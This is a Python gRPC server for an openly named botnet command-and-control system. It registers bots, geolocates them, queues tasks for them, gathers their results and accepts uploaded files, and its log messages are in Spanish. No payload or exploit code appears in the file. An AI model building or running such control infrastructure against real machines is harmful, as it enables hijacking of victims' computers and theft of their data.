import grpc
import signal
from concurrent import futures
import sys
from protos.botnet_pb2 import *
from protos.botnet_pb2_grpc import *
from server.modules import connection, tareas, bot, log, database, chunks
from server.modules.utils import files

SERVER_PORT = "50051"
db = None

def signal_handler(sig, frame):
    log.add("./server/logs/server/server", "SERVER", "SERVER", f"El servidor ha sido detenido", "OK")
    db.close()
    sys.exit(0)

class Botnet(BotnetServicer):
    
    # ADD BOT DATABASE

    def SetConnection(self, request, context):
        return connection.add_connection(request, db)

    # GET TOTAL BOTS, GET BOT, GET GEOLOCATION BOTS

    def GetBots(self, request, context):
        for b in bot.get_bots(db, 1):
            yield b

    def GetActiveBots(self, request, context):
        for b in bot.get_bots(db, 0):
            yield b
    
    def GetBot(self, request, context):
        return bot.get_bot(db, request)

    def GetGlobalBots(self, request, context):
        for geo in bot.get_geobots(db):
            yield geo

    # ADD TASK

    def AddTask(self, request_iterator, context):
        for task in request_iterator:
            tareas.add_task(db, task)
        return Response(status="OK", type="ADMIN")

    # GET PENDING TASKS

    def GetTasks(self, request, context):
        for task in tareas.get_pending_tasks(db):
            yield task

    def GetTasksBot(self, request, context):
        for task in tareas.get_pending_tasks_bot(db, request):
            yield task

    # SAVE COMPLETED TASKS

    def SendStreamComplete(self, request_iterator, context):
        for task in request_iterator:
            tareas.save_task(db, task)
        return Response(status="OK", type="CONNECTION")

    # GET COMPLETE TASKS

    def GetComplete(self, request, context):
        for task in tareas.get_completed_tasks(db):
            yield task

    def GetCompleteBot(self, request, context):
        for task in tareas.get_completed_tasks_bot(db, request):
            yield task

    # GET SPECIFIC TASK

    def GetTask(self, request, context):
        return tareas.get_task_id(db, request)

    # FILES

    def SendFile(self, request_iterator, context):
        data = []
        for chunk in request_iterator:
            data.append(chunk)
        return chunks.save_file(data)

    def GetFile(self, request, context):
        for c in chunks.get_file(request):
            yield c

if __name__ == '__main__':
    files.check_start()
    server = grpc.server(futures.ThreadPoolExecutor(max_workers=10))
    try:
        private_key = files.read_file("./certs/server.key")
    except:
        log.add("./server/logs/server/server", "SERVER", "SERVER", f"No se ha encontrado la clave privada relacionada con el servidor", "ERROR")
        sys.exit(0)
    try:
        certificate_chain = files.read_file("./certs/localhost.crt")
        certificate_chain_env = files.read_file("./certs/env.crt")
    except:
        log.add("./server/logs/server/server", "SERVER", "SERVER", f"No se ha encontrado el certificado correspondiente a la clave privada del servidor", "ERROR")
        sys.exit(0)
    server_credentials = grpc.ssl_server_credentials(((private_key, certificate_chain), (private_key, certificate_chain_env)))
    server.add_secure_port(f"[::]:{SERVER_PORT}", server_credentials)
    add_BotnetServicer_to_server(Botnet(), server)
    db = database.sql_connection()
    database.create_tables(db)
    log.add("./server/logs/server/server", "SERVER", "SERVER", f"El servidor se ha conectado con la base de datos", "OK")
    server.start()
    log.add("./server/logs/server/server", "SERVER", "SERVER", f"El servidor ha sido inicializado en el puerto {SERVER_PORT}", "OK")
    signal.signal(signal.SIGINT, signal_handler)
    server.wait_for_termination()